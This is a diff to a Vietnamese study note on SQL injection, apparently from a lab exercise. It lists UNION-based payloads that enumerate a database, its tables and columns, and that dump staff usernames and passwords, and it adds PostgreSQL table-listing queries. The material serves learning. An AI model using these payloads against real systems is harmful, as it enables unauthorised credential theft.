@@ -6,7 +6,17 @@
 	- `0 UNION SELECT 1,2,database()`: dò tên db
 	- `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: dò các table
 	- `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'  -- -:` dò các cột table
-	- `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users -- -`: display ra dữ liệu	
+	- `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users -- -`: display ra dữ liệu
+- payload cho postgre
+```
+SELECT table_schema, table_name
+FROM information_schema.tables
+WHERE table_catalog = 'NOTEDB' AND table_type = 'BASE TABLE';
+-- hoặc (khi đã ở trong NOTEDB)
+SELECT schemaname, tablename
+FROM pg_catalog.pg_tables
+WHERE schemaname NOT IN ('pg_catalog','information_schema');
+```
 ### Blind SQLi
 - ko biết kết quả trả về của truy vấn
 ##### Authentication Bypass
